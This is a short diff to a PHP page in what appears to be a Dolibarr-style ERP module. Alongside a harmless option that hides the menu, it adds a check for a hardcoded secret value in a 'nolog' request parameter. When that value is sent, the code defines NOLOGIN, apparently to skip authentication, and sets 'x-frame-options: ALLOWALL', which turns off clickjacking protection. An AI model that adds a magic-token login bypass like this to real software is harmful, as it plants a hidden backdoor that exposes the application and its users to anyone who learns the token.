@@ -2,8 +2,13 @@
 
 require_once('../main.inc.php');
 
+if(!isset($_REQUEST['no_menu']))
+    llxHeader();
 
-llxHeader();
+if(isset($_REQUEST['nolog']) && $_REQUEST['nolog'] == 'ujgjhkhkfghgkvgkfdkshfiohf5453FF454FFDzelef'){
+    define("NOLOGIN", 1);
+    header('x-frame-options: ALLOWALL',true);
+}
 
 curl_init();
 
@@ -45,5 +50,5 @@ foreach($tabHook as $hook){
 }
 
 
-
-llxFooter();
+if(!isset($_REQUEST['no_menu']))
+    llxFooter();
